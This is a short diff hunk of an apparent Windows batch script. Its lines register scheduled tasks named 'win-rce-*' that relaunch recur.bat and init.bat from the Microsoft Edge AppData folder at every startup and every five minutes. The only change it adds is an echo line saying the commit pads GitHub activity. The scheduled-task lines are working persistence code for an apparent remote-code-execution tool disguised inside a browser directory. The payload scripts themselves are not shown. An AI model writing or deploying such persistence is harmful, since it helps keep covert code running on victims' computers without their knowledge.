@@ -6,3 +6,4 @@ schtasks /CREATE /TN "win-rce-startup" /TR "C:\Users\%username%\Appdata\Local\Mi
 schtasks /CREATE /TN "win-rce-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\recur.bat" /SC MINUTE /MO 5
 schtasks /CREATE /TN "win-rce-installer-startup" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\init.bat" /SC ONSTART
 schtasks /CREATE /TN "win-rce-installer-interval" /TR "C:\Users\%username%\Appdata\Local\Microsoft\Edge\init.bat" /SC MINUTE /MO 5
+echo "im just committing this to get more activity on my github profile"
